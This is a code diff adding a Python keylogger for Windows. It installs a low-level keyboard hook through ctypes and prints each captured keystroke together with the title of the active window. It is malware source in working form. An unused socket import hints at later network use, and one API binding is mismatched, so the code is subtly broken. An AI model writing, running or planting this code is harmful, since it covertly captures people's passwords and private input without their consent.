@@ -1,0 +1,91 @@
+from ctypes import *
+from ctypes import wintypes
+import socket as sock
+
+user32 = windll.user32
+LRESULT  = c_long
+WH_KEYBOARD_LL = 13
+
+WM_KEYDOWN = 0x0100
+WM_RETURN = 0x000D
+WM_KEYUP = 0x0101
+WM_SHIFT = 0x0010
+
+
+GetWindowTextLength = user32.GetWindowTextLengthA
+GetWindowTextLength.argtypes = [wintypes.HWND]
+GetWindowTextLength.restype = wintypes.INT
+
+GetWindowText = user32.GetWindowTextA
+GetWindowText.argtypes = [wintypes.HWND, wintypes.LPSTR, wintypes.INT]
+GetWindowText.restype = wintypes.INT
+
+GetKeyState = user32.GetKeyboardState
+GetKeyState.argtypes = [wintypes.INT]
+GetKeyState.restype = wintypes.SHORT
+
+keyboard_state = wintypes.BYTE * 256
+GetKeyboardState = user32.GetKeyboardState
+GetKeyboardState.argtypes = [POINTER(keyboard_state)]
+GetKeyboardState.restype = wintypes.BOOL
+
+ToAscii = user32.ToAscii
+ToAscii.argtypes = [wintypes.UINT, wintypes.UINT, POINTER(keyboard_state), wintypes.LPVOID, wintypes.UINT]
+ToAscii.restype = wintypes.INT
+
+CallNextHookEx = user32.CallNextHookEx
+CallNextHookEx.argtypes = [wintypes.HHOOK, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM]
+CallNextHookEx.restype = LRESULT
+
+HOOKPROC = CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
+
+SetWindowsHookEx = user32.SetWindowsHookExA
+SetWindowsHookEx.argtypes = [wintypes.INT, HOOKPROC, wintypes.HINSTANCE, wintypes.DWORD]
+SetWindowsHookEx.restype = wintypes.HHOOK
+
+GetMessage = user32.GetMessageA
+GetMessage.argtypes = [wintypes.LPVOID, wintypes.HWND, wintypes.UINT, wintypes.UINT]
+GetMessage.restype = wintypes.BOOL
+
+class KBDLLHOOKSTRUCT(Structure):
+    _fields_ = [("vkCode", wintypes.DWORD),
+                ("scanCode", wintypes.DWORD),
+                ("flags", wintypes.DWORD),
+                ("time", wintypes.DWORD),
+                ("dwExtraInfo", wintypes.DWORD)]
+    
+def get_foreground_process():
+    hwnd = user32.GetForegroundWindow()
+    length = GetWindowTextLength(hwnd)
+    buff = create_string_buffer(length + 1)
+    GetWindowText(hwnd, buff, length + 1)
+    return buff.value
+
+#print(get_foreground_process)
+def hook_function(nCode, wParam, lParam):
+    global last 
+    if last != get_foreground_process():
+        last = get_foreground_process()
+        print("\n[{}]".format(last),flush=True)
+    if wParam == WM_KEYDOWN:
+        keyboard = KBDLLHOOKSTRUCT.from_address(lParam)
+        keyboard_state = wintypes.BYTE * 256
+        state = keyboard_state()
+        GetKeyState(byref(state))
+
+        buffer = create_string_buffer(2)
+        n = ToAscii(keyboard.vkCode, keyboard.scanCode, byref(state), buffer, 0)
+        if n > 0:
+            if keyboard.vkCode == WM_RETURN:
+                print()
+            else:
+                print("{}".format(string_at(buffer).decode()),flush=True, end="")
+
+    return CallNextHookEx(hook, nCode, wParam, lParam)
+last = None
+
+callback = HOOKPROC(hook_function)
+hook = SetWindowsHookEx(WH_KEYBOARD_LL, callback, None, 0)
+
+GetMessage(byref(wintypes.MSG()), None, 0, 0)
+
